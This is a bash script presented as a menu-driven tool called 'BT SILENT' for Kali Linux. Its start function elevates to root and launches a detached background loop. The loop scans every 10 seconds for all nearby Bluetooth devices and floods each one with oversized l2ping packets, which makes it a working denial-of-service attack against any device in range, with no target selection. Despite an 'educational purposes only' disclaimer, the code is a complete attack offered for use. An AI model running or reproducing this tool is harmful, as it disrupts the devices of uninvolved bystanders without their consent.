#!/bin/bash
RED='\e[1;31m'
GRN='\e[1;32m'
BLU='\e[1;34m'
YEL='\e[1;33m'
WHT='\e[1;37m'
CYN='\e[1;36m'
RST='\e[0m'

# ========== USAGE ==========
echo -e "${CYN}=========================================${RST}"
echo -e "${CYN}           BT SILENT — USAGE             ${RST}"
echo -e "${CYN}=========================================${RST}"
echo -e "${WHT}  Command:    bt-silent${RST}"
echo -e "${WHT}  Requires:   sudo / root privileges${RST}"
echo -e "${WHT}  Platform:   Kali Linux / Debian${RST}"
echo -e "${WHT}  Author:     williamkreese21${RST}"
echo -e "${CYN}=========================================${RST}"
echo ""

banner() {
    clear
    echo -e "${RED}=========================================${RST}"
    echo -e "${GRN}**                                   **${RST}"
    echo -e "${BLU}         BT SILENT v1.0.0${RST}"
    echo ""
    figlet -f slant "BT SILENT" | lolcat
    echo -e "${GRN}      by williamkreese21${RST}"
    echo ""
    echo -e "${WHT}        *      /\\      *${RST}"
    echo -e "${CYN}      *       /  \\       *${RST}"
    echo -e "${CYN}   --------/------\\--------${RST}"
    echo -e "${BLU}   |       \\      /       |${RST}"
    echo -e "${YEL}    \\_______\\    /_______/${RST}"
    echo -e "${RED}         *           *${RST}"
    echo ""
    echo -e "${GRN}**                                   **${RST}"
    echo -e "${RED}=========================================${RST}"
    echo ""
}

start() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${YEL}[*] Need root... Restarting with sudo...${RST}"
        sudo "$0"
        exit $?
    fi
    pkill l2ping 2>/dev/null
    echo -e "${GRN}[OK] BT SILENT STARTED${RST}"
    echo -e "${YEL}[*] Auto-scan & attack running...${RST}"
    (
        while true; do
            DEVICES=$(hcitool scan 2>/dev/null | awk "NR>1 {print \$1}")
            for MAC in $DEVICES; do
                l2ping -i hci0 -s 600 -f "$MAC" >/dev/null 2>&1 &
            done
            sleep 10
        done
    ) >/dev/null 2>&1 & disown
    echo ""
    echo -e "${WHT}Press Enter to return...${RST}"
    read -r
}

stop() {
    echo -e "${YEL}[*] Stopping all attacks...${RST}"
    pkill l2ping 2>/dev/null
    pkill -f "bt-silent.sh" 2>/dev/null
    sleep 1
    echo -e "${GRN}[OK] ALL STOPPED${RST}"
    echo ""
    echo -e "${WHT}Press Enter to return...${RST}"
    read -r
}

status() {
    echo -e "${BLU}[*] Checking status...${RST}"
    echo ""
    if pgrep l2ping >/dev/null; then
        PROCS=$(pgrep -c l2ping)
        echo -e "${GRN}[RUNNING] ACTIVE — Processes: ${PROCS}${RST}"
        echo ""
        echo -e "${YEL}Devices found:${RST}"
        hcitool scan 2>/dev/null | awk "NR>1 {print \"  -> \" \$1}"
    else
        echo -e "${RED}[STOPPED] NOT RUNNING${RST}"
    fi
    echo ""
    echo -e "${WHT}Press Enter to return...${RST}"
    read -r
}

about() {
    clear
    echo -e "${CYN}=========================================${RST}"
    echo -e "${CYN}           BT SILENT - INFO              ${RST}"
    echo -e "${CYN}=========================================${RST}"
    echo -e "${WHT} Version:     1.0.0${RST}"
    echo -e "${WHT} Author:      williamkreese21${RST}"
    echo -e "${WHT} License:     MIT${RST}"
    echo -e "${CYN}=========================================${RST}"
    echo -e "${RED} EDUCATIONAL PURPOSES ONLY!${RST}"
    echo -e "${RED} Unauthorized use is ILLEGAL.${RST}"
    echo -e "${CYN}=========================================${RST}"
    echo ""
    echo -e "${WHT}Press Enter to return...${RST}"
    read -r
}

while true; do
    banner
    echo -e "${WHT}========== MENU ==========${RST}"
    echo -e "${GRN} 1. Start BT SILENT${RST}"
    echo -e "${RED} 2. Stop BT SILENT${RST}"
    echo -e "${BLU} 3. Check Status${RST}"
    echo -e "${CYN} 4. About${RST}"
    echo -e "${YEL} 0. Exit${RST}"
    echo -e "${WHT}==========================${RST}"
    echo ""
    echo -ne "${WHT}Enter choice [0-4]: ${RST}"
    read -r CHOICE
    case "$CHOICE" in
        1) start ;;
        2) stop ;;
        3) status ;;
        4) about ;;
        0) echo -e "${GRN}Goodbye!${RST}"; exit 0 ;;
        *) echo -e "${RED}[!] Invalid option!${RST}"; sleep 1 ;;
    esac
done
